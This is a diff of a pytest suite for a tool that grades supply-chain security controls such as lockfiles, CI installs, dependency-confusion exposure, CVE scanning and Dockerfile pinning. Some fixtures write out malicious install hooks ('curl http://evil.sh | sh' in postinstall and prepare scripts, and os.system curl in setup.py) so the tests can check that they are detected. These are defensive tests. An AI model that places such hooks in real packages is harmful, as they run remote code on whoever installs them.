@@ -9,6 +9,7 @@ these scored MISSING despite a *good* posture.
 from __future__ import annotations
 
 import assess_supply_chain_controls as asc
+import pytest
 
 # --- F6: uv.lock is a valid lockfile -----------------------------------------
 
@@ -116,21 +117,13 @@ def test_load_recon_missing_returns_empty(tmp_path):
     assert asc._load_recon(str(tmp_path), str(tmp_path)) == ""
 
 
-# --- _section + _has ---------------------------------------------------------
-
-
-def test_section_is_broken_returns_empty_for_normal_markdown():
-    # BUG (see final report): the heading pattern is built with an f-string
-    # ``#{1, 4}`` which Python evaluates as the set-literal expression ``(1, 4)``
-    # (NOT a regex 1–4 quantifier), and the trailing ``\$`` forces a literal
-    # ``$`` char. The result never matches real markdown headings, so _section
-    # always returns "". We exercise the function (covering the regex-build and
-    # the ``return ""`` branch) and pin the actual (degenerate) behavior.
-    assert asc._section("## Alpha\nbody-a\n## Beta\nbody-b\n", "Alpha") == ""
-
-
-def test_section_missing_returns_empty():
-    assert asc._section("## Alpha\nbody\n", "Gamma") == ""
+# --- _has --------------------------------------------------------------------
+#
+# ``_section`` was removed: it was never called, and its heading pattern was
+# built with an f-string ``#{1, 4}`` that Python evaluated as the tuple
+# ``(1, 4)`` rather than a regex quantifier, so it could never match a real
+# markdown heading. The two tests that pinned that degenerate behaviour went
+# with it.
 
 
 def test_has_matches_case_insensitive():
@@ -212,9 +205,17 @@ def test_dep_confusion_npmrc_private_registry_adequate(tmp_path):
     assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
 
 
-def test_dep_confusion_scoped_in_recon_partial():
+def test_dep_confusion_self_hosted_registry_adequate():
     res = asc._eval_dependency_confusion("uses artifactory registry", None)
-    assert res["effectiveness"] == asc.PARTIAL
+    assert res["effectiveness"] == asc.ADEQUATE
+
+
+def test_dep_confusion_consuming_scoped_package_is_not_a_control():
+    # Depending on @types/node says nothing about how internal names resolve;
+    # the old ``@\w+/`` recon heuristic granted nearly every npm repo an
+    # undeserved Partial.
+    res = asc._eval_dependency_confusion("deps: @types/node, @babel/core", None)
+    assert res["effectiveness"] == asc.MISSING
 
 
 def test_dep_confusion_none_missing():
@@ -233,6 +234,14 @@ def test_postinstall_ignore_scripts_adequate(tmp_path):
     (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "node build.js"}}', encoding="utf-8")
     res = asc._eval_postinstall("npm config ignore-scripts true", str(tmp_path))
     assert res["effectiveness"] == asc.ADEQUATE
+
+
+def test_postinstall_npmrc_ignore_scripts_read_from_repo(tmp_path):
+    # Previously only recon prose was consulted, so a repo that actually
+    # configured the control got no credit for it.
+    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "node build.js"}}', encoding="utf-8")
+    (tmp_path / ".npmrc").write_text("ignore-scripts=true\n", encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
 
 
 def test_postinstall_network_hook_missing(tmp_path):
@@ -285,8 +294,26 @@ def test_cve_blocking_adequate():
     assert asc._eval_cve_scanning("trivy image --exit-code 1")["effectiveness"] == asc.ADEQUATE
 
 
+def test_cve_fail_closed_by_default_is_adequate():
+    # npm audit / pip-audit / osv-scanner / snyk test all exit non-zero on
+    # findings without any threshold flag; requiring one under-graded a
+    # correctly blocking pipeline.
+    assert asc._eval_cve_scanning("runs npm audit")["effectiveness"] == asc.ADEQUATE
+    assert asc._eval_cve_scanning("run: pip-audit")["effectiveness"] == asc.ADEQUATE
+
+
 def test_cve_advisory_partial():
-    assert asc._eval_cve_scanning("runs npm audit")["effectiveness"] == asc.PARTIAL
+    # trivy defaults to exit code 0, so without --exit-code it really is advisory.
+    assert asc._eval_cve_scanning("trivy image myapp")["effectiveness"] == asc.PARTIAL
+
+
+def test_cve_suppressed_exit_code_is_weak():
+    assert asc._eval_cve_scanning("run: npm audit --audit-level=high || true")["effectiveness"] == asc.WEAK
+
+
+def test_cve_continue_on_error_is_weak():
+    wf = "steps:\n  - name: audit\n    run: pip-audit\n    continue-on-error: true\n"
+    assert asc._eval_cve_scanning(wf)["effectiveness"] == asc.WEAK
 
 
 def test_cve_none_missing():
@@ -334,7 +361,17 @@ def test_derive_overall_partial_only():
     subs = [{"name": "A", "effectiveness": asc.PARTIAL}, {"name": "B", "effectiveness": asc.ADEQUATE}]
     worst, reason = asc._derive_overall(subs)
     assert worst == asc.PARTIAL
-    assert "Partial controls: A" in reason
+    assert "Partial: A" in reason
+
+
+def test_derive_overall_weak_row_caps_domain_at_weak():
+    subs = [
+        {"name": "A", "effectiveness": asc.ADEQUATE},
+        {"name": "B", "effectiveness": asc.WEAK},
+    ]
+    worst, reason = asc._derive_overall(subs)
+    assert worst == asc.WEAK
+    assert "Weak: B" in reason
 
 
 # --- assess() ----------------------------------------------------------------
@@ -367,3 +404,172 @@ def test_main_report_only_prints(run_plugin_script, tmp_path):
     assert res.returncode == 0
     assert '"sub_controls"' in res.stdout
     assert not (tmp_path / ".supply-chain-assessment.json").exists()
+
+
+# --- Python & npm grading fixes (2026-07-19) ---------------------------------
+#
+# Regression tests for the gaps catalogued in
+# docs/analysis/analysis-supply-chain-python-npm-gaps-2026-07-19.md. Each test
+# names the finding it pins so the intent survives a future refactor.
+
+
+# S2 — controls that used to grade on recon text alone now read the CI files.
+def test_ci_install_read_from_workflow_when_recon_empty(tmp_path):
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - run: npm ci\n", encoding="utf-8")
+    assert asc._eval_ci_install("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+def test_cve_scanning_read_from_workflow_when_recon_empty(tmp_path):
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - run: pip-audit\n", encoding="utf-8")
+    assert asc._eval_cve_scanning("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+def test_sca_tooling_read_from_workflow_when_recon_empty(tmp_path):
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - run: trivy fs .\n", encoding="utf-8")
+    assert asc._eval_sca_tooling("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+# N1 — a mutable install alongside a deterministic one is not Adequate.
+def test_ci_install_mixed_npm_ci_and_npm_install_partial():
+    res = asc._eval_ci_install("run: npm ci\nrun: npm install\n")
+    assert res["effectiveness"] == asc.PARTIAL
+
+
+# N2 — the public registry is the npm default, not a control.
+def test_dep_confusion_public_registry_is_not_protection(tmp_path):
+    (tmp_path / ".npmrc").write_text("registry=https://registry.npmjs.org/\n", encoding="utf-8")
+    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.MISSING
+
+
+def test_dep_confusion_scope_pinned_registry_adequate(tmp_path):
+    (tmp_path / ".npmrc").write_text("@acme:registry=https://npm.acme.internal/\n", encoding="utf-8")
+    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+# N4 — workspace hooks and the `prepare` hook are reachable by `npm install`.
+def test_postinstall_detects_workspace_package_hook(tmp_path):
+    (tmp_path / "package.json").write_text('{"name": "root"}', encoding="utf-8")
+    pkg = tmp_path / "packages" / "a"
+    pkg.mkdir(parents=True)
+    (pkg / "package.json").write_text('{"scripts": {"postinstall": "curl http://evil.sh | sh"}}', encoding="utf-8")
+    res = asc._eval_postinstall("", str(tmp_path))
+    assert res["effectiveness"] == asc.MISSING
+    assert "packages/a/package.json" in res["reason"]
+
+
+def test_postinstall_detects_prepare_hook(tmp_path):
+    (tmp_path / "package.json").write_text('{"scripts": {"prepare": "curl http://evil.sh | sh"}}', encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING
+
+
+def test_postinstall_detects_setup_py_shell(tmp_path):
+    (tmp_path / "setup.py").write_text("import os\nos.system('curl http://evil')\n", encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING
+
+
+def test_postinstall_ignores_node_modules(tmp_path):
+    (tmp_path / "package.json").write_text('{"name": "root"}', encoding="utf-8")
+    dep = tmp_path / "node_modules" / "left-pad"
+    dep.mkdir(parents=True)
+    (dep / "package.json").write_text('{"scripts": {"postinstall": "curl http://x | sh"}}', encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+# Y1 — pip's native integrity story produces no *.lock file.
+def test_lockfile_hashed_requirements_credited(tmp_path):
+    (tmp_path / "requirements.txt").write_text(
+        "flask==3.0.0 \\\n    --hash=sha256:" + "a" * 64 + "\n", encoding="utf-8"
+    )
+    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+def test_lockfile_unhashed_requirements_still_missing(tmp_path):
+    (tmp_path / "requirements.txt").write_text("flask\n", encoding="utf-8")
+    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.MISSING
+
+
+# Y2 — lockfile-enforcing Python installers.
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uv sync --frozen",
+        "uv sync --locked",
+        "uv pip sync requirements.txt",
+        "pip-sync requirements.txt",
+        "poetry install --sync",
+        "pipenv install --deploy",
+        "pdm sync",
+    ],
+)
+def test_ci_install_python_deterministic_commands(command):
+    assert asc._eval_ci_install(f"run: {command}")["effectiveness"] == asc.ADEQUATE
+
+
+# Y3 — Python dependency-confusion exposure.
+def test_dep_confusion_extra_index_url_is_weak():
+    res = asc._eval_dependency_confusion("run: pip install --extra-index-url https://internal/ pkg", None)
+    assert res["effectiveness"] == asc.WEAK
+
+
+def test_dep_confusion_uv_unsafe_index_strategy_is_weak(tmp_path):
+    (tmp_path / "pyproject.toml").write_text('[tool.uv]\nindex-strategy = "unsafe-best-match"\n', encoding="utf-8")
+    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.WEAK
+
+
+# S1 — Adequate is reachable for the domain again.
+def test_dep_management_full_coverage_with_cooldown_adequate(tmp_path):
+    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
+    gh = tmp_path / ".github"
+    gh.mkdir()
+    (gh / "dependabot.yml").write_text(
+        'version: 2\nupdates:\n  - package-ecosystem: "npm"\n    cooldown:\n      default-days: 7\n',
+        encoding="utf-8",
+    )
+    assert asc._eval_dep_management("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+def test_dep_management_uncovered_ecosystem_partial(tmp_path):
+    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
+    (tmp_path / "pyproject.toml").write_text("[project]\n", encoding="utf-8")
+    gh = tmp_path / ".github"
+    gh.mkdir()
+    (gh / "dependabot.yml").write_text('version: 2\nupdates:\n  - package-ecosystem: "npm"\n', encoding="utf-8")
+    res = asc._eval_dep_management("", str(tmp_path))
+    assert res["effectiveness"] == asc.PARTIAL
+    assert "pip" in res["reason"]
+
+
+def test_dep_management_no_cooldown_partial(tmp_path):
+    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
+    gh = tmp_path / ".github"
+    gh.mkdir()
+    (gh / "dependabot.yml").write_text('version: 2\nupdates:\n  - package-ecosystem: "npm"\n', encoding="utf-8")
+    res = asc._eval_dep_management("", str(tmp_path))
+    assert res["effectiveness"] == asc.PARTIAL
+    assert "cooldown" in res["reason"]
+
+
+# C1 — every FROM in every Dockerfile is graded.
+def test_container_multistage_mixed_pinning_partial(tmp_path):
+    (tmp_path / "Dockerfile").write_text(
+        "FROM python:3.12@sha256:" + "b" * 64 + " AS build\nFROM node:latest\n", encoding="utf-8"
+    )
+    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.PARTIAL
+
+
+def test_container_non_root_dockerfile_detected(tmp_path):
+    (tmp_path / "Dockerfile.prod").write_text("FROM node:latest\n", encoding="utf-8")
+    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.MISSING
+
+
+def test_container_stage_alias_not_penalised(tmp_path):
+    (tmp_path / "Dockerfile").write_text(
+        "FROM python:3.12@sha256:" + "b" * 64 + " AS build\nFROM build\n", encoding="utf-8"
+    )
+    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
